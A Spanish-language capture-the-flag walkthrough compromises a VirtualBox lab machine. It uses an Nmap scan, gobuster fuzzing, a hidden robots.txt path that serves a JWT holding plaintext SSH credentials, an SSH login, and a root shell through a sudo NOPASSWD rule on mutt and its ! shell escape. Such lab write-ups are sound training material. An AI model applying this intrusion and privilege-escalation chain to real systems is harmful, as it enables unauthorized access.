hacemos un escaneo con Nmap en este caso yo puse la ip en una variable para usarla mas rápidamente.
```bash
ip=192.168.1.140
sudo nmap -p- --open -sS -sC -sV -Pn $ip -v -oN escaneo.txt

[sudo] contraseña para kali: 
Starting Nmap 7.94 ( https://nmap.org ) at 2024-03-23 15:42 -05
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 15:42
Completed NSE at 15:42, 0.00s elapsed
Initiating NSE at 15:42
Completed NSE at 15:42, 0.00s elapsed
Initiating NSE at 15:42
Completed NSE at 15:42, 0.00s elapsed
Initiating ARP Ping Scan at 15:42
Scanning 192.168.1.140 [1 port]
Completed ARP Ping Scan at 15:42, 0.05s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:42
Completed Parallel DNS resolution of 1 host. at 15:42, 0.00s elapsed
Initiating SYN Stealth Scan at 15:42
Scanning 192.168.1.140 (192.168.1.140) [65535 ports]
Discovered open port 21/tcp on 192.168.1.140
Completed SYN Stealth Scan at 15:42, 1.49s elapsed (65535 total ports)
Initiating Service scan at 15:42
Scanning 1 service on 192.168.1.140 (192.168.1.140)
Completed Service scan at 15:42, 2.05s elapsed (1 service on 1 host)
NSE: Script scanning 192.168.1.140.
Initiating NSE at 15:42
Completed NSE at 15:43, 14.46s elapsed
Initiating NSE at 15:43
Completed NSE at 15:43, 6.13s elapsed
Initiating NSE at 15:43
Completed NSE at 15:43, 0.00s elapsed
Nmap scan report for 192.168.1.140 (192.168.1.140)
Host is up (0.00011s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u4 (protocol 2.0)
|_ftp-bounce: ERROR: Script execution failed (use -d to debug)
| ssh-hostkey: 
|   2048 56:9b:dd:56:a5:c1:e3:52:a8:42:46:18:5e:0c:12:86 (RSA)
|   256 1b:d2:cc:59:21:50:1b:39:19:77:1d:28:c0:be:c6:82 (ECDSA)
|_  256 9c:e7:41:b6:ad:03:ed:f5:a1:4c:cc:0a:50:79:1c:20 (ED25519)
MAC Address: 08:00:27:D2:BA:51 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 15:43
Completed NSE at 15:43, 0.00s elapsed
Initiating NSE at 15:43
Completed NSE at 15:43, 0.00s elapsed
Initiating NSE at 15:43
Completed NSE at 15:43, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.87 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)```
vemos que el puerto 21 generalmente asignado a ftp esta abierto, recordar que el puerto 22 es el asignado por defecto al ssh , hay que sospechar.
primero trate de conectarme a través de la web pero no hay respuesta
aquí entonces empleamos el comando 
```bash
❯ curl http://$ip:21

Hello Bro!
You only need a port to be happy...


```
hay algo de información,  por curiosidad hagamos un fuzzing haber si sale algo..
```bash
❯ gobuster dir -u http://$ip:21 -w CTF/thm/dic/common.txt -q
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.hta                 (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 49]
/robots.txt           (Status: 200) [Size: 58]
/server-status        (Status: 200) [Size: 4027]

```
ha salido algo ahora hay que probar nuevamente con curl haber que pasa..
por defecto el archivo mas interesante es robots.txt
```bash
❯ curl http://$ip:21/robots.txt
User-agent: *
Disallow: /9a618248b64db62d15b300a07b00580b

```
bingo tenemos un tipo de hash o algún tipo de contenido que esta siendo oculto de forma intencional.
seguimos usando curl 
```bash
❯ curl http://$ip:21/9a618248b64db62d15b300a07b00580b
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://192.168.1.140:21/9a618248b64db62d15b300a07b00580b/">here</a>.</p>
<hr>
<address>Apache/2.4.38 (Debian) Server at 192.168.1.140 Port 21</address>
</body></html>

```
tenemos un archivo HTML que esta siendo ocultado de los navegadores.. usamos curl pero agregando una barra / 
```bash
curl http://$ip:21/9a618248b64db62d15b300a07b00580b/
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiIiLCJpYXQiOm51bGwsImV4cCI6bnVsbCwiYXVkIjoiIiwic3ViIjoiIiwiaWQiOiIxIiwidXNlcm5hbWUiOiJtYXVybyIsInBhc3N3b3JkIjoibUB1UjAxMjMhIn0.zMeVhhqARJ6YzuMtwahGQnegFDhF7r0BCPf3H9ljDIk
```
ahora tenemos un token jwt (json web token)
en mi caso usare python 
```python 
import jwt
import json

def decodificar_jwt(token):

    try:

        token_decodificado = jwt.decode(token, algorithms=['HS256'], options={

                                        "verify_signature": False})

        return token_decodificado

    except jwt.ExpiredSignatureError:

        return "Token caducado"

    except jwt.InvalidTokenError as e:

        return "Error en el token: " + str(e)
        
token_jwt = input("Ingresa el token JWT: ")

datos_decodificados = decodificar_jwt(token_jwt)

datos = (datos_decodificados)

print(json.dumps(datos, indent=4))

```
lo corro desde el vs por que es un script de prueba.
```python
Ingresa el token JWT: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiIiLCJpYXQiOm51bGwsImV4cCI6bnVsbCwiYXVkIjoiIiwic3ViIjoiIiwiaWQiOiIxIiwidXNlcm5hbWUiOiJtYXVybyIsInBhc3N3b3JkIjoibUB1UjAxMjMhIn0.zMeVhhqARJ6YzuMtwahGQnegFDhF7r0BCPf3H9ljDIk
{
    "iss": "",
    "iat": null,
    "exp": null,
    "aud": "",
    "sub": "",
    "id": "1",
    "username": "mauro",   
    "password": "m@uR0123!"
}
```
tenemos usuario y contraseña para conectarnos via ssh
bien... ya tenemos acceso ssh
```bash
❯ ssh mauro@192.168.1.140 -p 21
mauro@192.168.1.140's password: 
mauro@plex:~$ 


```
como buena practica siempre usar <h1>sudo -L</h1> para saber a que tenemos acceso como usuarios root..
en este caso  hay acceso como root 
```bash
mauro@plex:~$ sudo -l
Matching Defaults entries for mauro on plex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User mauro may run the following commands on plex:
    (root) NOPASSWD: /usr/bin/mutt

```
tenemos un acceso a /usr/bin/mutt
ahora vamos a ejecutarlo.
ponemos sudo /usr/bin/mutt y enter
luego en ponemos el simbolo ! para activar la barra de comandos y ponemos /bin/bash
```bash
mauro@plex:~$ sudo /usr/bin/mutt
root@plex:/home/mauro# 

```
ya somos usuarios root
happy hacking!!!
